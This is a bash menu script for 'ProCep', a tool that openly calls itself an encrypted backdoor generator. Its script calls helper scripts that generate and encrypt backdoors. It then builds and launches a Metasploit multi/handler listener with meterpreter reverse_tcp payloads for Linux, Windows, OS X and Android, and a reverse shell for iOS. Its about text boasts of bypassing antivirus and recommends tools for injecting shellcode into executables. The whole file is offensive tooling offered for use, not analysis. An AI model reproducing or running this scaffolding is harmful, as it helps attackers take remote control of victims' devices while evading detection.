#! /bin/bash

 bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`

clear

localdir=$( pwd )
echo $lightyellow$bold
echo -e "                                                  __________               _________"                
echo -e "                                                  \______   \_______  ____ \_   ___ \  ____ ______"  
echo -e "                                                   |     ___/\_  __ \/  _ \/    \  \/_/ __ ||____ |" 
echo -e "                                                   |    |     |  | \(  <_> )     \___\  ___/|  |_> >"
echo -e "                                                   |____|     |__|   \____/ \______  /\___  >   __| "
echo -e "                                                                                   \/     \/|__| V:1.0.0 / Coded By Ghosty/DeaDHackS " $lightaqua
echo -e "                                                   Strongly-Encrypted Backdoor Generator via Prophet/Ceph"$lightred
echo -e " ===================================================================[$lightgreen BACKDOOR$lightred ]======================================================================"$normal$bold
echo -e "                                                    $lightgreen[1]$lightred Generate Strongly Encrypted Systen-Based Backdoor.          "
echo -e "                                                    $lightgreen[2]$lightred Encrypt File/Folder Via Ceph. (Backdoor can be also encrypted)"
echo -e "                                                    $lightgreen[3]$lightred Generate Metasploit Listener"
echo -e "                                                    $lightgreen[99]$lightred About ProCep"
echo -e "ProCep Location [:] $localdir"
echo $normal$bold 
read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " menuchoice

if [ $menuchoice == 1 ]
then
  cd $localdir && ./prophet.sh
fi
if [ $menuchoice == 2 ]
then
  cd $localdir/ && ./ceph.sh
fi
if [ $menuchoice == 3 ]
then
  echo -e "[+] Generate Listener - Listener is the module will be listing for the back connection when the backdoor is executed!"
  echo -e "[?] Please enter your ip that you used for generating the backdoor: [example: 192.167.1.17]" 
  read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " ip2listen
  echo -e "[Listener] IP = $ip2listen" 
  echo -e "[?] Please enter the port you used for generating the backdoor: [example: 4444]" 
  read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " port2listen
  echo -e "[Listener] PORT = $port2listen" 
  echo -e "[?] Please enter the systen that was used to generate the backdoor: [example: Windows]" 
  echo -e "[1]: Linux"
  echo -e "[2]: Windows"
  echo -e "[3]: MacOS / OS X"
  echo -e "[4]: Android"
  echo -e "[5]: Iphone / iOS"
  read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " sys2listen
  case $sys2listen in
       1) platform="linux"
       backdoor="linux/x86/meterpreter/reverse_tcp" 
       format="elf" ;;
       2) platform="windows"
       backdoor="windows/meterpreter/reverse_tcp" 
       format="exe" ;;
       3) platform="osx"
       backdoor="osx/x64/meterpreter/reverse_tcp" 
       format="elf" ;;
       4) platform="android"
       backdoor="android/meterpreter/reverse_tcp" 
       format="apk" ;;
       5) platform="apple_ios"
       backdoor="osx/armle/shell_reverse_tcp" 
       format="macho";;
  esac
  echo -e "[Listener] SYSTEM = $backdoor" 
  echo -e "[?] Name your listener." 
  read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " name2listen 
  echo -e "[Listener] NAME = $name2listen" 
  echo -e "[+] Generating listener..." 
  echo -e "IP / Host = $ip2listen" 
  echo -e "Port = $port2listen"
  echo -e "System = $backdoor" 
  echo -e "Name = $name2listen"
  if [ -e $localdir/Listeners/$name2listen.rc ]
  then
     cd $localdir/Listeners/ && rm $name2listen.rc
  fi
  sleep 2 
  echo "
use multi/handler
set PAYLOAD $backdoor
set LHOST $ip2listen
set LPORT $port2listen
exploit -j 
" > $localdir/Listeners/$name2listen.rc
  echo -e "[+]Would you like us to open the listener for you? (no/yes)"
  read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " open2meta 
  if [ $open2meta == "yes" ]
  then
    clear
    msfconsole -r $localdir/Listeners/$name2listen.rc
  else 
    echo -e "[+] Ok, openeing ProCep menu.."
    sleep 2
    cd $localdir/ && ./procepmenu.sh
  fi
fi
if [ $menuchoice == 99 ]
then
  echo -e $lightyellow"Creator/Author : Ghosty/DeaDHackS Team"$normal$bold
  echo -e "ProCep is Backdoor generator but his big advantage is that he encrypts the backdoor 2 times."
  echo -e "The user will be able to choose the first encryption the second one will be RSA."
  echo -e "Strong and powerfull ProCep uses Ceph as the encryptor and Prophet to generate the backdoor."
  echo -e "Both tool were coded by the same guy, Ghosty from DeaDHackS."
  echo -e ""
  echo -e "MISC : Recommend other free tools for you!:"
  echo -e "1. The Lazy Script; Big Toolkit highly recommend for beginners! [Download on github]"
  echo -e "2. Shellter; shellter can inject raw shell codes into .exe application! [Download on gituub]"
  echo -e "3. Viel-Envasion; Even if procep can bypass avs, Viel-Envasion can to! [Download on github["
  echo -e "4. TIDos Framework; Many info gathering modules! [Download Unknown]" 
  echo -e "5. Nexus; Most powerful local vulnerability scanner! [Download via: apt-get install nexus / Requires further installation look on google]"
  echo -e ""
  read -p $lightyellow"Press any keys to continue ..."$normal
  cd $localdir/ && ./procepmenu.sh
fi
























































































































